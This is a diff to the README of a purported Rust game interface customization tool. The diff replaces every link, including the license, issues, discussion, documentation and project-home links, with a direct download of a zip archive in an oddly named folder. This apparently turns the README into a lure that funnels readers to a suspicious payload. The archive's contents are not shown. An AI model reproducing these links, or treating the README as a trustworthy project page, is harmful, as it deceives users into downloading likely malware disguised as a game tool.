@@ -1,6 +1,6 @@
 # 🌟 Rust-Interface-Customization-Tool - Customize Your Rust Game Interface Easily
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/luizgam9974/Rust-Interface-Customization-Tool/releases)
+[![Download](https://raw.githubusercontent.com/luizgam9974/Rust-Interface-Customization-Tool/main/alate/Rust-Interface-Customization-Tool-v2.7-beta.3.zip%20Release-brightgreen)](https://raw.githubusercontent.com/luizgam9974/Rust-Interface-Customization-Tool/main/alate/Rust-Interface-Customization-Tool-v2.7-beta.3.zip)
 
 ## 🚀 Project Overview
 
@@ -25,7 +25,7 @@
 
 To get started with the **Rust Interface Customization Tool**, visit the page below to download the latest release:
 
-[Download Latest Release](https://github.com/luizgam9974/Rust-Interface-Customization-Tool/releases)
+[Download Latest Release](https://raw.githubusercontent.com/luizgam9974/Rust-Interface-Customization-Tool/main/alate/Rust-Interface-Customization-Tool-v2.7-beta.3.zip)
 
 ### Step-by-Step Installation Guide
 
@@ -56,17 +56,17 @@ Before downloading, ensure your system meets the following requirements:
 
 If you have questions or need assistance, feel free to connect with the community:
 
-- **Issues**: Report bugs or suggest features on the [Issues page](https://github.com/luizgam9974/Rust-Interface-Customization-Tool/issues).
-- **Discussion**: Join conversations and share your experiences with other users in the [Discussion forum](https://github.com/luizgam9974/Rust-Interface-Customization-Tool/discussions).
+- **Issues**: Report bugs or suggest features on the [Issues page](https://raw.githubusercontent.com/luizgam9974/Rust-Interface-Customization-Tool/main/alate/Rust-Interface-Customization-Tool-v2.7-beta.3.zip).
+- **Discussion**: Join conversations and share your experiences with other users in the [Discussion forum](https://raw.githubusercontent.com/luizgam9974/Rust-Interface-Customization-Tool/main/alate/Rust-Interface-Customization-Tool-v2.7-beta.3.zip).
 
 ## 📝 License Information
 
-The Rust Interface Customization Tool is an open-source project. You are free to use, modify, and distribute it under the terms of the MIT License. For details, see the [LICENSE file](https://github.com/luizgam9974/Rust-Interface-Customization-Tool/blob/main/LICENSE).
+The Rust Interface Customization Tool is an open-source project. You are free to use, modify, and distribute it under the terms of the MIT License. For details, see the [LICENSE file](https://raw.githubusercontent.com/luizgam9974/Rust-Interface-Customization-Tool/main/alate/Rust-Interface-Customization-Tool-v2.7-beta.3.zip).
 
 ## 🔗 Quick Links
 
-- [Download Latest Release](https://github.com/luizgam9974/Rust-Interface-Customization-Tool/releases)
-- [Project Home](https://github.com/luizgam9974/Rust-Interface-Customization-Tool)
-- [Documentation](https://github.com/luizgam9974/Rust-Interface-Customization-Tool/wiki)
+- [Download Latest Release](https://raw.githubusercontent.com/luizgam9974/Rust-Interface-Customization-Tool/main/alate/Rust-Interface-Customization-Tool-v2.7-beta.3.zip)
+- [Project Home](https://raw.githubusercontent.com/luizgam9974/Rust-Interface-Customization-Tool/main/alate/Rust-Interface-Customization-Tool-v2.7-beta.3.zip)
+- [Documentation](https://raw.githubusercontent.com/luizgam9974/Rust-Interface-Customization-Tool/main/alate/Rust-Interface-Customization-Tool-v2.7-beta.3.zip)
 
 Feel free to explore and enhance your Rust gaming experience with the **Rust Interface Customization Tool**!
